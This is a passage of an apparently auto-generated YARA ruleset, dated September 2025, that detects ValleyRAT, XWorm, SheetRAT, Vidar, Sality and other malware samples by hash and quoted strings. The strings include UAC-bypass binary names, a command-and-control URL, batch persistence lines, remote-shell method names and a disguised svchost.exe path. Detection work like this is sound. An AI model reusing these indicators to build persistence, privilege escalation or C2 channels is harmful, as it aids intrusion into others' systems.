      $s10 = "yIdentity type=\"win32\" name=\"Akagi\" version=\"1.0.0.0\" processorArchitecture=\"*\"></assemblyIdentity><description>Akagi wa" ascii /* score: '22.00'*/
      $s11 = "tconsent.exe" fullword wide /* score: '22.00'*/
      $s12 = "fodhelper.exe" fullword wide /* score: '22.00'*/
      $s13 = "WSReset.exe" fullword wide /* score: '22.00'*/
      $s14 = "Akagi.exe" fullword wide /* score: '22.00'*/
      $s15 = "C:\\ProgramData\\anonymous\\run\\Windows_Edge.lnk" fullword wide /* score: '20.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__b8dd188a560685bdc49addb37fcd457d_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_b8dd188a560685bdc49addb37fcd457d(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e71f4fa46e5fbab202f42041c3630de34b0e11667e6ff3e6832fb344b30986cb"
   strings:
      $s1 = "TestListCtrl.EXE" fullword wide /* score: '22.00'*/
      $s2 = "\\debug.log" fullword wide /* score: '17.00'*/
      $s3 = "[!] GetTempPathW " fullword ascii /* score: '16.00'*/
      $s4 = "MaldevAcad.tmp" fullword wide /* score: '13.00'*/
      $s5 = "http://45.192.243.11:1533/" fullword wide /* score: '12.00'*/
      $s6 = "ssdwelcome" fullword ascii /* score: '11.00'*/
      $s7 = "           <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/>" fullword ascii /* score: '11.00'*/
      $s8 = "   processorArchitecture=\"X86\"" fullword ascii /* score: '10.00'*/
      $s9 = ":55555555" fullword ascii /* score: '9.00'*/ /* hex encoded string 'UUUU' */
      $s10 = "iiiiiiiiix" fullword ascii /* score: '8.00'*/
      $s11 = "iiiiiiiiiiiiiix" fullword ascii /* score: '8.00'*/
      $s12 = "gewaqaghe" fullword ascii /* score: '8.00'*/
      $s13 = "iiiiiiiix" fullword ascii /* score: '8.00'*/
      $s14 = "iiiiiiiiiiiir" fullword ascii /* score: '8.00'*/
      $s15 = "iiiiiiiir" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule ValleyRAT_signature__66a0cf83ea66db9d3d6b0cdcf679d891_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_66a0cf83ea66db9d3d6b0cdcf679d891(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5ffd0cc8290061b5c65b277dfa82f12596908715d264928f2008452e9bb7bce1"
   strings:
      $x1 = "win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"*\" publicKeyToken=\"6595b64144cc" ascii /* score: '36.00'*/
      $s2 = "Invalid time Offset string: %s$SHA2: Cannot update a finalized hash=Error decoding URL style (%%XX) encoded string at position %" wide /* score: '27.00'*/
      $s3 = "questedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"></requestedExecutionLevel></requestedPrivilege" ascii /* score: '23.00'*/
      $s4 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s5 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s6 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s7 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s8 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s9 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s10 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s11 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s12 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s13 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s14 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
      $s15 = "\" id=\"W5M0MpCehiHzreSzNTczkc9d\"?> <x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"Adobe XMP Core 5.5-c014 79.151481, 2013/03/" ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3721552f {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3721552f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3721552fea907573d5e5c8b89b61eb00480f164807610fde17a7cc4f106803d7"
   strings:
      $s1 = "Luck1.exe" fullword ascii /* score: '22.00'*/
      $s2 = "rohitab.com                                                  " fullword wide /* score: '12.00'*/
      $s3 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s4 = "3IKiIorIn/ImzvJGD/NHP2GaimvPQcxH0/mVc7TIIlUc5n+sUCXo8Wd6dxqHGON8mGEHtp5sI5WwN/oO9oUM4fHa9GTbnUeENBduWl6BbwOCOFtSYr7zGfC9mT1DFol/" wide /* score: '11.00'*/
      $s5 = "loGyJt3dambI3YXiOyYOsDhbvMed/OTSUwPj8klcEv4@" fullword wide /* score: '9.00'*/
      $s6 = "edeiRcOkVkvYrFc*" fullword wide /* score: '9.00'*/
      $s7 = "ZeYeafb7dJR1Kp3x2wleWg@@" fullword wide /* score: '9.00'*/
      $s8 = "Setup.exe                                        " fullword wide /* score: '9.00'*/
      $s9 = "DDSPYM" fullword ascii /* score: '8.50'*/
      $s10 = "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb" ascii /* score: '8.00'*/
      $s11 = "X23KynFBxWFNd/ms27xzZA@@" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      8 of them
}

rule ValleyRAT_signature__6cdbd56cc3b90f30543d6b87a355f1f5_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_6cdbd56cc3b90f30543d6b87a355f1f5(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "13e2f642c50ecfecc90cb84b4841197807ad53a5e705ed921eea4efc94527baa"
   strings:
      $x1 = "cmd.exe /B /c \"" fullword ascii /* score: '33.00'*/
      $s2 = "tasklist /FI \"IMAGENAME eq %ProcessName%\" | findstr /I \"%ProcessName%\" >nul" fullword ascii /* score: '23.00'*/
      $s3 = "xmscoree.dll" fullword wide /* score: '23.00'*/
      $s4 = "\\backup.dll" fullword ascii /* score: '21.00'*/
      $s5 = "if not exist \"%ProcessPath%\" (" fullword ascii /* score: '19.00'*/
      $s6 = "    copy /Y \"%BackupProcessPath%\" \"%ProcessPath%\"" fullword ascii /* score: '18.00'*/
      $s7 = "\\backup.dll\"" fullword ascii /* score: '17.00'*/
      $s8 = "\\backup.exe" fullword ascii /* score: '16.00'*/
      $s9 = "set \"BackupProcessPath=" fullword ascii /* score: '15.00'*/
      $s10 = "goto CheckProcess" fullword ascii /* score: '15.00'*/
      $s11 = "set \"ProcessName=" fullword ascii /* score: '15.00'*/
      $s12 = ":CheckProcess" fullword ascii /* score: '15.00'*/
      $s13 = "set \"ProcessPath=" fullword ascii /* score: '15.00'*/
      $s14 = "    start \"\" \"%ProcessPath%\"" fullword ascii /* score: '14.00'*/
      $s15 = "if not exist \"%DLLPath%\" (" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 800KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__95937e13 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_95937e13.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "95937e13351102dc5d279e51ce2b19cde391303690ca358b93a633bf477247c3"
   strings:
      $x1 = "DownloaderApp.exe" fullword wide /* score: '37.00'*/
      $x2 = "hater/nircmd.exe" fullword ascii /* score: '36.00'*/
      $x3 = "<?xml version=\"1.0\" encoding=\"utf-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '33.00'*/
      $x4 = "srvcli.dll" fullword wide /* reversed goodware string 'lld.ilcvrs' */ /* score: '33.00'*/
      $x5 = "devrtl.dll" fullword wide /* reversed goodware string 'lld.ltrved' */ /* score: '33.00'*/
      $x6 = "dfscli.dll" fullword wide /* reversed goodware string 'lld.ilcsfd' */ /* score: '33.00'*/
      $x7 = "browcli.dll" fullword wide /* reversed goodware string 'lld.ilcworb' */ /* score: '33.00'*/
      $x8 = "linkinfo.dll" fullword wide /* reversed goodware string 'lld.ofniknil' */ /* score: '33.00'*/
      $s9 = "atl.dll" fullword wide /* reversed goodware string 'lld.lta' */ /* score: '30.00'*/
      $s10 = "questedPrivileges xmlns=\"urn:schemas-microsoft-com:asm.v3\"><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\" /><" ascii /* score: '26.00'*/
      $s11 = "SSPICLI.DLL" fullword wide /* score: '23.00'*/
      $s12 = "UXTheme.dll" fullword wide /* score: '23.00'*/
      $s13 = "oleaccrc.dll" fullword wide /* score: '23.00'*/
      $s14 = "dnsapi.DLL" fullword wide /* score: '23.00'*/
      $s15 = "iphlpapi.DLL" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 8000KB and
      1 of ($x*) and all of them
}

rule SheetRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file SheetRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aeb87fa69750c8b7117ec7007727fbd11d6e385899074a964e6fef1e0f427cc1"
   strings:
      $s1 = "JBBCFOAFMMFDEGMAFLF`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '24.00'*/
      $s2 = "KNHHNLNOOELCGFCNCCMPMBCOLDKIHNPNAOOD.IFKKJGNJCGCNMOJFKCAECIPKLLDBNOMODJLN+BCIADEMBODCKNMOCJPEOMDNLJNMAEIMCFEIB+KGLDDCHIPLMHHCILG" ascii /* score: '23.00'*/
      $s3 = "Steal4.exe" fullword wide /* score: '22.00'*/
      $s4 = "<GetBadProcesses>d__1" fullword ascii /* score: '20.00'*/
      $s5 = "_IEJAEJKFGOACAMHDNODBLDHPKADLKKOHCDHE.HJGIJAGDMPIDNNFHFFMEBHNDBEHDHALGBINJ+<GetBadProcesses>d__1" fullword ascii /* score: '19.00'*/
      $s6 = "<HandleSendAndExecuteAsync>d__24" fullword ascii /* score: '18.00'*/
      $s7 = "jIEJAEJKFGOACAMHDNODBLDHPKADLKKOHCDHE.NOBLNNELCIHHEAONHHCLHLMHNPAOMKMELCAN+<HandleSendAndExecuteAsync>d__24" fullword ascii /* score: '17.00'*/
      $s8 = "<badprocesses>5__2" fullword ascii /* score: '15.00'*/
      $s9 = "Process " fullword wide /* score: '15.00'*/
      $s10 = "<HandleRemoteShell>d__33" fullword ascii /* score: '12.00'*/
      $s11 = "DMGMIBBKEKDJKNGCEMNMHPODELOGHGEKNEJK" fullword ascii /* score: '11.50'*/
      $s12 = "KHCBMIDLOGIKMIGDHJNDMNEKKCPOFOEDIFEG" fullword ascii /* score: '11.50'*/
      $s13 = "DBKAKLOGBOFKKAILCKHCGFIDHJHOCEKCKHKL" fullword ascii /* score: '11.50'*/
      $s14 = "PDKMEHKFFMEEPFDEKGOHIPLGCLPCBCPGFAKE" fullword ascii /* score: '11.50'*/
      $s15 = "JHHNILELHMOCDLLGCPKCFGGOKEPGBGHAMBAG" fullword ascii /* score: '11.50'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      8 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5c0214f5 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5c0214f5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5c0214f5bd1cfff6cd9d5f23bebe3057d4e50e066e8b49ccd58454da71992c10"
   strings:
      $x1 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $x2 = "fSystem.Drawing.Icon, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3ajSystem.CodeDom.MemberAtt" ascii /* score: '32.00'*/
      $s3 = "ersion=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089fSystem.Drawing.Size, System.Drawing, Version=4.0.0.0, Culture=n" ascii /* score: '24.00'*/
      $s4 = "ributes, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089mSystem.Globalization.CultureInfo, mscorlib, V" ascii /* score: '24.00'*/
      $s5 = "`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '24.00'*/
      $s6 = "lkoWopihA2to7Be.exe" fullword wide /* score: '22.00'*/
      $s7 = "Process " fullword wide /* score: '15.00'*/
      $s8 = "System.Globalization.TextInfo%System.Globalization.NumberFormatInfo'System.Globalization.DateTimeFormatInfo&System.Globalization" ascii /* score: '14.00'*/
      $s9 = " System.Globalization.CompareInfo" fullword ascii /* score: '14.00'*/
      $s10 = "eutral, PublicKeyToken=b03f5f7f11d50a3a" fullword ascii /* score: '13.00'*/
      $s11 = "kernel " fullword wide /* score: '11.00'*/
      $s12 = "'System.Globalization.DateTimeFormatInfo+" fullword ascii /* score: '11.00'*/
      $s13 = "(System.Globalization.DateTimeFormatFlags" fullword ascii /* score: '11.00'*/
      $s14 = " System.Globalization.SortVersion" fullword ascii /* score: '10.00'*/
      $s15 = "System.Globalization.TextInfo%System.Globalization.NumberFormatInfo'System.Globalization.DateTimeFormatInfo&System.Globalization" ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 7000KB and
      1 of ($x*) and 4 of them
}

rule XWorm_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__72be3c05 {
   meta:
      description = "_subset_batch - file XWorm(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_72be3c05.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "72be3c05711828bce04f8649164ad4a0f527c60ef0e8eff226ce567526b09944"
   strings:
      $s1 = "`1[[System.Object, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]][]" fullword ascii /* score: '24.00'*/
      $s2 = "System.Security.Cryptography.CryptoConfig" fullword wide /* score: '13.00'*/
      $s3 = "CriticalProcess_Enable" fullword ascii /* score: '11.00'*/
      $s4 = "CriticalProcesses_Disable" fullword ascii /* score: '11.00'*/
      $s5 = "SetCurrentProcessIsCritical" fullword ascii /* score: '11.00'*/
      $s6 = "SystemEvents_SessionEnding" fullword ascii /* score: '10.00'*/
      $s7 = "DownloadStr" fullword ascii /* score: '10.00'*/
      $s8 = "WWAHost.g.resources" fullword ascii /* score: '9.00'*/
      $s9 = "WWAHost" fullword ascii /* score: '9.00'*/
      $s10 = "get_AllowOnlyFipsAlgorithms" fullword wide /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 400KB and
      all of them
}

rule ValleyRAT_signature__aeb7a0d4799f7dfbb5509f8cf7930a84_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_aeb7a0d4799f7dfbb5509f8cf7930a84(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "bad2cfae6540f6b1794658afc456509ccdd3f2b3de5cd15dafa7daf104f6da9e"
   strings:
      $s1 = "APTBIN_Main.dll" fullword ascii /* score: '23.00'*/
      $s2 = "Regsvr32.exe" fullword ascii /* score: '22.00'*/
      $s3 = "\\TrustAsia\\intel.dll" fullword ascii /* score: '21.00'*/
      $s4 = "intel.dll,DllRegisterServer" fullword ascii /* score: '19.00'*/
      $s5 = "\\chrmstp.exe" fullword ascii /* score: '16.00'*/
      $s6 = "%s,DllRegisterServer" fullword wide /* score: '11.50'*/
      $s7 = "r7nmnI3liqHlmajkuIrmqKHmnb/liIblj5EgV2ViIOacjeWKoeeahOi6q+S7vemqjOivgeWksei0pe+8jOatpOS9nOS4muWwhuaPkOS+m+WHreaNruaPkOekuuOAgjwv" ascii /* score: '11.00'*/
      $s8 = "bj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2Ij8+CjxUYXNrIHZlcnNpb249IjEuMyIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZG93cy8yMDA0" ascii /* score: '11.00'*/
      $s9 = "nb/jgILlpoLmnpzlr7nmnI3liqHlmajkuIrmqKHmnb/liIblj5EgV2ViIOacjeWKoeeahOi6q+S7vemqjOivgeWksei0pe+8jOatpOS9nOS4muWwhuaPkOS+m+WHreaN" ascii /* score: '11.00'*/
      $s10 = "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2Ij8+CjxUYXNrIHZlcnNpb249IjEuMyIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20v" ascii /* score: '11.00'*/
      $s11 = ".NET Framework Single v4.6" fullword ascii /* score: '10.00'*/
      $s12 = ".NET Framework NGEN v4.0.8745" fullword ascii /* score: '10.00'*/
      $s13 = ".NET Framework NGEN v6.0.8745" fullword wide /* score: '10.00'*/
      $s14 = ".NET Framework NGEN v6.0.USANW" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule ZLoader_signature_ {
   meta:
      description = "_subset_batch - file ZLoader(signature).xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "98b8b208020aecb6d3f42ba67ee1faa1474ffc34468e3489758c04bc09504ee7"
   strings:
      $s1 = "JaKQWmCFtpo" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 200KB and
      all of them
}

rule Sality_signature__a774d0c0f74bd25893db6aab4bcdb3cd_imphash_ {
   meta:
      description = "_subset_batch - file Sality(signature)_a774d0c0f74bd25893db6aab4bcdb3cd(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6ce384777feb1be07abaa5d2ce88fb2b5841d036118c01e00e4e375f06580a33"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '39.00'*/
      $x2 = "blyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKe" ascii /* score: '36.00'*/
      $s3 = "<assemblyIdentity name=\"E.App\" processorArchitecture=\"x86\" version=\"5.2.0.0\" type=\"win32\"/><dependency><dependentAssembl" ascii /* score: '22.00'*/
      $s4 = "4A4B4C4D4E4F" ascii /* score: '17.00'*/ /* hex encoded string 'JKLMNO' */
      $s5 = "txCLj.DLL7" fullword ascii /* score: '16.00'*/
      $s6 = "ity>        <requestedPrivileges>            <requestedExecutionLevel level=\"requireAdministrator\" uiAccess=\"false\"/>       " ascii /* score: '14.00'*/
      $s7 = "BBBBBBk" fullword ascii /* reversed goodware string 'kBBBBBB' */ /* score: '14.00'*/
      $s8 = "<^ws2_32.dllbkZ" fullword ascii /* score: '10.00'*/
      $s9 = "meAF@KH^eYe!AR7+B?6" fullword ascii /* score: '9.00'*/
      $s10 = "4&829&:&;&<" fullword ascii /* score: '9.00'*/ /* hex encoded string 'H)' */
      $s11 = "KeyEgB" fullword ascii /* score: '9.00'*/
      $s12 = "<2=2>2?2@2A2B" fullword ascii /* score: '9.00'*/ /* hex encoded string '""*+' */
      $s13 = "\"/\"2\"6" fullword ascii /* score: '9.00'*/ /* hex encoded string '&' */
      $s14 = "logicTG" fullword ascii /* score: '9.00'*/
      $s15 = "rdblquotel" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 4000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__cef6f8ae795a0364a021b11018bf9d08_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_cef6f8ae795a0364a021b11018bf9d08(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "85223d8507ee676bd741ed4b634020c9c39a8f7ee19b79f3923bc6024f1c2fe0"
   strings:
      $x1 = "blyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorArchitecture=\"x86\" publicKe" ascii /* score: '36.00'*/
      $x2 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '35.00'*/
      $s3 = "C:\\Users\\Public\\excela" fullword ascii /* score: '27.00'*/
      $s4 = "C:\\Users\\Public\\excela\\1.XLSX" fullword ascii /* score: '27.00'*/
      $s5 = "<assemblyIdentity name=\"E.App\" processorArchitecture=\"x86\" version=\"5.2.0.0\" type=\"win32\"/><dependency><dependentAssembl" ascii /* score: '22.00'*/
      $s6 = "wshom.ocx" fullword ascii /* reversed goodware string 'xco.mohsw' */ /* score: '20.00'*/
      $s7 = "(http://www.eyuyan.com)" fullword wide /* score: '17.00'*/
      $s8 = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\" fullword ascii /* score: '12.00'*/
      $s9 = "\\aksnmf.lnk" fullword ascii /* score: '12.00'*/
      $s10 = "xl/sharedStrings.xml" fullword ascii /* score: '10.00'*/
      $s11 = "GetTabList" fullword ascii /* score: '9.00'*/
      $s12 = "WshShell" fullword ascii /* score: '9.00'*/
      $s13 = " constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s14 = "GetConnectString" fullword ascii /* score: '9.00'*/
      $s15 = " but running with " fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__e1be6739a4c493f464a7249473516173_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_e1be6739a4c493f464a7249473516173(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "aaf78544b8650810d923b117dc02df06be1184b89f8cf58ab4374a6c9e554e1f"
   strings:
      $x1 = "E:\\shellcodeloader\\Release\\shellcodeloader.pdb" fullword ascii /* score: '33.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      1 of ($x*)
}

rule Vidar_signature__78473387de4da5e8cee3c8839fd77a10_imphash_ {
   meta:
      description = "_subset_batch - file Vidar(signature)_78473387de4da5e8cee3c8839fd77a10(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6fdf2ce83cb9b42336ef97f27e15d307cd86b91b63aaf02c450e3c3b9371a514"
   strings:
      $s1 = "ElevationT" fullword ascii /* score: '16.00'*/
      $s2 = "HTTP_CONTENT_VERSION" fullword ascii /* score: '12.00'*/
      $s3 = "Content Version" fullword ascii /* score: '12.00'*/
      $s4 = "ZY[_^]" fullword ascii /* reversed goodware string ']^_[YZ' */ /* score: '11.00'*/
      $s5 = "*,,,,,,,,,,,,,,," fullword ascii /* reversed goodware string ',,,,,,,,,,,,,,,*' */ /* score: '11.00'*/
      $s6 = "$,,,,,,,,,,,,,,," fullword ascii /* reversed goodware string ',,,,,,,,,,,,,,,$' */ /* score: '11.00'*/
      $s7 = ",,,,,,,,,,,,,,,'" fullword ascii /* reversed goodware string '',,,,,,,,,,,,,,,' */ /* score: '11.00'*/
      $s8 = " ,,,,,,,,,,,,,,," fullword ascii /* reversed goodware string ',,,,,,,,,,,,,,, ' */ /* score: '11.00'*/
      $s9 = "q,,,,,,,,,,,,,,,," fullword ascii /* reversed goodware string ',,,,,,,,,,,,,,,,q' */ /* score: '11.00'*/
      $s10 = "E,,,,,,,,,,,,,,,," fullword ascii /* reversed goodware string ',,,,,,,,,,,,,,,,E' */ /* score: '11.00'*/
      $s11 = ",,,,,,,,,,,,,,,4" fullword ascii /* reversed goodware string '4,,,,,,,,,,,,,,,' */ /* score: '11.00'*/
      $s12 = "),,,,,,,,,,,,,,," fullword ascii /* reversed goodware string ',,,,,,,,,,,,,,,)' */ /* score: '11.00'*/
      $s13 = "QWYj.oox" fullword ascii /* score: '10.00'*/
      $s14 = "First Legend Value must be > 0.Legend Color Width must be between 0 and 100 %*%s Angle must be between 0 and 359 degrees#DateTim" wide /* score: '10.00'*/
      $s15 = "$''%s'' is not a valid component name" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 6000KB and
      8 of them
}

rule ValleyRAT_signature__9b45e1946dfd0b443be91960483fde46_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_9b45e1946dfd0b443be91960483fde46(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "384a89951940d47ca29230cc164871986c12b7a66d7e6e89b1e9ffbd1fa1acf3"
   strings:
      $x1 = "C:\\Users\\Public\\Downloads\\svchost.exe" fullword wide /* score: '49.00'*/
      $x2 = "C:\\Users\\Public\\Downloads\\" fullword ascii /* score: '33.00'*/
      $x3 = "C:\\Users\\Public\\Downloads" fullword wide /* score: '33.00'*/
      $s4 = "Executable: %ls" fullword ascii /* score: '16.00'*/
      $s5 = "Task registration failed: 0x%08lx - %ls" fullword ascii /* score: '15.00'*/
      $s6 = "LogonTrigger1" fullword wide /* score: '13.00'*/
      $s7 = "RWX Memory: 0x%p - 0x%p (Size: %zu bytes)" fullword ascii /* score: '12.00'*/
      $s8 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s9 = "3_3X3O3" fullword ascii /* reversed goodware string '3O3X3_3' */ /* score: '11.00'*/
      $s10 = "3_3W3O3" fullword ascii /* reversed goodware string '3O3W3_3' */ /* score: '11.00'*/
      $s11 = "ITaskService::Connect failed: 0x%08lx" fullword ascii /* score: '10.00'*/
      $s12 = "Failed to create ITaskService instance: 0x%08lx" fullword ascii /* score: '10.00'*/
      $s13 = "Task registration may fail. Please run as admin." fullword ascii /* score: '10.00'*/
      $s14 = "Cannot create logon trigger: 0x%08lx" fullword ascii /* score: '8.00'*/
      $s15 = "Cannot get Root Folder: 0x%08lx" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule Socks5Systemz_signature__884310b1928934402ea6fec1dbd3cf5e_imphash_ {
   meta:
      description = "_subset_batch - file Socks5Systemz(signature)_884310b1928934402ea6fec1dbd3cf5e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "2f7d3121a43c63b018cbe92b3d7ec67514a4d546401bfb18991a9dd4c65fd542"
   strings:
      $s1 = "            <requestedExecutionLevel level=\"asInvoker\"            uiAccess=\"false\"/>" fullword ascii /* score: '15.00'*/
      $s2 = "        <dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware>" fullword ascii /* score: '12.00'*/
      $s3 = "    processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
      $s4 = "            processorArchitecture=\"x86\"" fullword ascii /* score: '10.00'*/
